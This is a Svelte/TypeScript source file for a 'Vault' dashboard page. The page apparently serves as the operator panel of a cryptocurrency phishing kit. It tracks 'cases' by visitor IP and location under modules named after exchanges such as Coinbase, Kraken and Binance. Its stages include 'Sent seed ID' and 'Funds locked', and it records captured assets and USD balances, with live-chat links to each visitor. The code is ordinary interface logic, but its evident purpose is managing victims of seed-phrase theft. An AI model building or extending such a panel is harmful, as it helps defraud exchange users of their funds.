<script lang="ts">
	import { onMount } from 'svelte';
	import {
		Vault,
		Search,
		RefreshCw,
		Activity,
		DollarSign,
		Clock,
		Trash2,
		Edit3,
		MessageSquare,
		ExternalLink,
		Save,
		AlertCircle
	} from 'lucide-svelte';
	import { sendMessage, vaultEvent } from '$lib/stores/websocket';
	import ConnectionBadge from '$lib/components/ConnectionBadge.svelte';
	import { toast } from '$lib/stores/toast';
	import { MODULES } from '$lib/modules';

	interface VaultAsset {
		id: string;
		caseId: string;
		symbol: string;
		amount: number;
		usdValue: number;
		createdAt: number;
	}
	interface VaultCase {
		id: string;
		visitorIp: string;
		module: string;
		location: string;
		activity: string;
		status: string;
		balanceUsd: number;
		pending: number;
		completed: number;
		createdAt: number;
		updatedAt: number;
		capturedBy: string;
		assets: VaultAsset[];
	}
	interface Overview {
		activeCases: number;
		totalBalanceUsd: number;
		pending: number;
		completed: number;
		totalAssets: number;
	}

	let cases: VaultCase[] = $state([]);
	let overview: Overview = $state({
		activeCases: 0,
		totalBalanceUsd: 0,
		pending: 0,
		completed: 0,
		totalAssets: 0
	});
	let search = $state('');
	let moduleFilter = $state('');
	let activityFilter = $state('');
	let loading = $state(false);
	let editingId = $state<string | null>(null);
	let editActivity = $state('');
	let editStatus = $state('');
	let editBalance = $state('');
	let confirmDelete = $state<{ id: string; visitorIp: string } | null>(null);

	const ACTIVITY_OPTIONS = [
		'Sent seed ID',
		'Verifying ID',
		'Waiting for reply',
		'ID valid',
		'Transfer ID sent',
		'Funds locked',
		'Funds released',
		'Closed'
	];

	async function fetchAll() {
		loading = true;
		try {
			const params = new URLSearchParams();
			if (search.trim()) params.set('search', search.trim());
			if (moduleFilter) params.set('module', moduleFilter);
			if (activityFilter) params.set('activity', activityFilter);
			const res = await fetch(`/api/vault?${params}`);
			if (res.ok) {
				const data = await res.json();
				cases = data.cases;
				overview = data.overview;
			}
		} finally {
			loading = false;
		}
	}

	let searchTimer: ReturnType<typeof setTimeout> | null = null;
	function onSearchInput() {
		if (searchTimer) clearTimeout(searchTimer);
		searchTimer = setTimeout(fetchAll, 250);
	}

	$effect(() => {
		[moduleFilter, activityFilter];
		fetchAll();
	});

	$effect(() => {
		if ($vaultEvent) fetchAll();
	});

	onMount(fetchAll);

	function startEdit(c: VaultCase) {
		editingId = c.id;
		editActivity = c.activity;
		editStatus = c.status;
		editBalance = String(c.balanceUsd);
	}

	function saveEdit() {
		if (!editingId) return;
		const balance = parseFloat(editBalance);
		sendMessage('vault:update', {
			id: editingId,
			activity: editActivity,
			status: editStatus,
			balanceUsd: Number.isFinite(balance) ? balance : 0
		});
		editingId = null;
	}

	function cancelEdit() {
		editingId = null;
	}

	function deleteCase(c: VaultCase) {
		confirmDelete = { id: c.id, visitorIp: c.visitorIp };
	}

	function performDelete() {
		if (!confirmDelete) return;
		sendMessage('vault:delete', { id: confirmDelete.id });
		toast.success(`Deleted vault case for ${confirmDelete.visitorIp}`);
		confirmDelete = null;
	}

	function handleEsc(e: KeyboardEvent) {
		if (e.key === 'Escape' && confirmDelete) confirmDelete = null;
	}

	function fmtUsd(v: number): string {
		if (!Number.isFinite(v)) return '$0';
		if (Math.abs(v) >= 1_000_000) return `$${(v / 1_000_000).toFixed(2)}M`;
		if (Math.abs(v) >= 1_000) return `$${(v / 1_000).toFixed(2)}k`;
		return `$${v.toFixed(2)}`;
	}

	function activityColor(a: string): string {
		const lc = a.toLowerCase();
		if (lc.includes('sent')) return 'bg-cyan-500/15 text-cyan-300 border-cyan-500/25';
		if (lc.includes('verify')) return 'bg-amber-500/15 text-amber-300 border-amber-500/25';
		if (lc.includes('waiting')) return 'bg-zinc-500/15 text-zinc-300 border-zinc-500/25';
		if (lc.includes('valid')) return 'bg-emerald-500/15 text-emerald-300 border-emerald-500/25';
		if (lc.includes('transfer')) return 'bg-blue-500/15 text-blue-300 border-blue-500/25';
		if (lc.includes('locked')) return 'bg-purple-500/15 text-purple-300 border-purple-500/25';
		if (lc.includes('released')) return 'bg-emerald-600/15 text-emerald-200 border-emerald-600/25';
		if (lc.includes('closed')) return 'bg-zinc-600/15 text-zinc-400 border-zinc-600/25';
		return 'bg-[var(--accent)]/30 text-[var(--muted-foreground)] border-[var(--border)]';
	}

	function moduleColor(m: string): string {
		const lc = (m || '').toLowerCase();
		if (lc.includes('vault')) return 'bg-purple-500/15 text-purple-300';
		if (lc.includes('coinbase')) return 'bg-blue-500/15 text-blue-300';
		if (lc.includes('kraken')) return 'bg-violet-500/15 text-violet-300';
		if (lc.includes('gemini')) return 'bg-cyan-500/15 text-cyan-300';
		if (lc.includes('binance')) return 'bg-amber-500/15 text-amber-300';
		return 'bg-[var(--accent)]/30 text-[var(--muted-foreground)]';
	}
</script>

<svelte:head>
	<title>Vault · Panel</title>
</svelte:head>

<svelte:window onkeydown={handleEsc} />

<div class="p-8 pt-5">
	<div class="mb-5 flex flex-wrap items-center justify-between gap-3">
		<div>
			<h1 class="text-2xl font-bold text-[var(--foreground)]">Vault</h1>
			<p class="mt-1 text-sm text-[var(--muted-foreground)]">
				{overview.activeCases} cases · {overview.totalAssets} assets
			</p>
		</div>
		<div class="flex items-center gap-2">
			<ConnectionBadge />
			<button onclick={fetchAll} aria-label="Refresh vault" class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
				<RefreshCw size={12} class={loading ? 'animate-spin' : ''} />
				Refresh
			</button>
		</div>
	</div>

	<!-- KPIs -->
	<div class="mb-4 grid grid-cols-1 gap-3 sm:grid-cols-3">
		<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
			<div class="flex items-center justify-between">
				<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Active Cases</p>
				<div class="flex h-7 w-7 items-center justify-center rounded-md bg-[var(--accent-primary)]/10 text-[var(--text-accent)]"><Vault size={13} /></div>
			</div>
			<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{overview.activeCases}</p>
		</div>
		<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
			<div class="flex items-center justify-between">
				<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Total Balance</p>
				<div class="flex h-7 w-7 items-center justify-center rounded-md bg-emerald-500/10 text-emerald-300"><DollarSign size={13} /></div>
			</div>
			<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{fmtUsd(overview.totalBalanceUsd)}</p>
		</div>
		<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
			<div class="flex items-center justify-between">
				<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Pending Requests</p>
				<div class="flex h-7 w-7 items-center justify-center rounded-md bg-amber-500/10 text-amber-300"><Clock size={13} /></div>
			</div>
			<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{overview.pending}</p>
		</div>
	</div>

	<!-- Filters -->
	<div class="mb-3 flex flex-wrap items-center gap-2 rounded-xl border border-[var(--border)] bg-[var(--card)] px-4 py-2.5">
		<div class="relative">
			<Search size={11} class="absolute left-2.5 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)]" />
			<input
				type="text"
				bind:value={search}
				oninput={onSearchInput}
				placeholder="Search by IP, module, location..."
				class="w-72 rounded-md border border-[var(--border)] bg-[var(--input)] py-1.5 pl-7 pr-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"
			/>
		</div>
		<select bind:value={moduleFilter} class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1.5 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
			<option value="">All Brands</option>
			{#each MODULES as m}
				<option value={m.id}>{m.label}</option>
			{/each}
		</select>
		<select bind:value={activityFilter} class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1.5 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
			<option value="">All Activities</option>
			{#each ACTIVITY_OPTIONS as a}
				<option value={a}>{a}</option>
			{/each}
		</select>
	</div>

	<!-- Cases -->
	<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
		{#if cases.length === 0}
			<div class="flex flex-col items-center justify-center py-16 text-center">
				<Vault size={36} class="mb-2 text-[var(--text-tertiary)]" />
				<p class="text-sm font-semibold text-[var(--foreground)]">No vault cases yet</p>
				<p class="mt-1 text-xs text-[var(--muted-foreground)]">Promote a session to Vault from the Sessions page.</p>
			</div>
		{:else}
			<div class="overflow-x-auto custom-scrollbar">
				<div class="min-w-[960px]">
			<div class="grid grid-cols-[minmax(0,1.4fr)_minmax(0,1fr)_minmax(0,1.5fr)_120px_minmax(0,1fr)_140px] gap-4 border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-5 py-2 text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">
				<span>IP / Module</span>
				<span>Location</span>
				<span>Activity</span>
				<span>Status</span>
				<span>Assets</span>
				<span class="text-right">Actions</span>
			</div>
			<div class="max-h-[60vh] overflow-y-auto custom-scrollbar">
				{#each cases as c (c.id)}
					<div class="grid grid-cols-[minmax(0,1.4fr)_minmax(0,1fr)_minmax(0,1.5fr)_120px_minmax(0,1fr)_140px] items-center gap-4 border-b border-[var(--border-subtle)] px-5 py-3 hover:bg-[var(--accent)]/30">
						<div class="min-w-0">
							<p class="truncate font-mono text-xs font-semibold text-[var(--foreground)]">{c.visitorIp}</p>
							<span class="mt-1 inline-flex w-fit rounded px-1.5 py-0.5 text-[10px] {moduleColor(c.module)}">{c.module || '—'}</span>
						</div>
						<div class="text-[11px] text-[var(--muted-foreground)] truncate">{c.location || '—'}</div>
						{#if editingId === c.id}
							<div class="flex flex-col gap-1">
								<select bind:value={editActivity} class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1 text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
									{#each ACTIVITY_OPTIONS as a}
										<option value={a}>{a}</option>
									{/each}
								</select>
							</div>
						{:else}
							<span class="inline-flex w-fit items-center rounded-md border px-2 py-0.5 text-[11px] font-medium {activityColor(c.activity)}">
								<Activity size={10} class="mr-1" />
								{c.activity}
							</span>
						{/if}
						{#if editingId === c.id}
							<input bind:value={editStatus} type="text" class="rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1 text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
						{:else}
							<span class="inline-flex w-fit items-center rounded-md border border-[var(--status-live)]/30 bg-[var(--status-live)]/10 px-2 py-0.5 text-[11px] font-medium text-[var(--status-live)]">
								{c.status}
							</span>
						{/if}
						{#if editingId === c.id}
							<div class="flex items-center gap-1">
								<span class="text-[10px] text-[var(--muted-foreground)]">$</span>
								<input
									bind:value={editBalance}
									type="number"
									step="0.01"
									class="w-24 rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1 text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
								/>
							</div>
						{:else}
							<div>
								<p class="text-xs font-semibold text-[var(--foreground)]">{fmtUsd(c.balanceUsd)}</p>
								{#if c.assets.length > 0}
									<p class="mt-0.5 text-[10px] text-[var(--muted-foreground)]">
										{c.assets.map((a) => a.symbol).join(' · ')}
									</p>
								{/if}
							</div>
						{/if}
						<div class="flex items-center justify-end gap-1">
							{#if editingId === c.id}
								<button onclick={saveEdit} class="rounded-md p-1.5 text-emerald-400 hover:bg-emerald-400/10" aria-label="Save">
									<Save size={11} />
								</button>
								<button onclick={cancelEdit} class="rounded-md border border-[var(--border)] px-2 py-1 text-[10px] text-[var(--muted-foreground)] hover:bg-[var(--accent)]">
									Cancel
								</button>
							{:else}
								<a href={`/livechat?ip=${encodeURIComponent(c.visitorIp)}`} class="rounded-md p-1.5 text-cyan-400 transition-soft hover:bg-cyan-400/10" title="Live Chat" aria-label="Open Live Chat">
									<MessageSquare size={11} />
								</a>
								<a href={`/sessions?search=${encodeURIComponent(c.visitorIp)}`} class="rounded-md p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]" title="Open in Sessions" aria-label="Open in Sessions">
									<ExternalLink size={11} />
								</a>
								<button onclick={() => startEdit(c)} class="rounded-md p-1.5 text-amber-400 transition-soft hover:bg-amber-400/10" title="Edit case" aria-label="Edit">
									<Edit3 size={11} />
								</button>
								<button onclick={() => deleteCase(c)} class="rounded-md p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" title="Delete case" aria-label="Delete">
									<Trash2 size={11} />
								</button>
							{/if}
						</div>
					</div>
				{/each}
			</div>
				</div>
			</div>
		{/if}
	</div>
</div>

{#if confirmDelete}
	<div
		class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
		role="dialog"
		aria-modal="true"
		aria-labelledby="confirm-vault-delete-title"
		tabindex="-1"
		onclick={() => (confirmDelete = null)}
		onkeydown={(e) => e.key === 'Escape' && (confirmDelete = null)}
	>
		<div
			class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl"
			role="document"
			onclick={(e) => e.stopPropagation()}
			onkeydown={(e) => e.stopPropagation()}
		>
			<div class="flex items-start gap-3">
				<div class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-[var(--destructive)]/15 text-[var(--destructive)]">
					<AlertCircle size={16} />
				</div>
				<div>
					<h3 id="confirm-vault-delete-title" class="text-base font-semibold text-[var(--foreground)]">
						Delete vault case?
					</h3>
					<p class="mt-2 text-sm text-[var(--muted-foreground)]">
						This will permanently delete the vault case for
						<span class="font-mono text-[var(--foreground)]">{confirmDelete.visitorIp}</span>,
						including any captured assets. This cannot be undone.
					</p>
				</div>
			</div>
			<div class="mt-6 flex justify-end gap-2">
				<button
					onclick={() => (confirmDelete = null)}
					class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]"
				>
					Cancel
				</button>
				<button
					onclick={performDelete}
					class="rounded-lg bg-[var(--destructive)] px-4 py-2 text-sm font-medium text-white transition-soft hover:opacity-90"
				>
					Delete case
				</button>
			</div>
		</div>
	</div>
{/if}
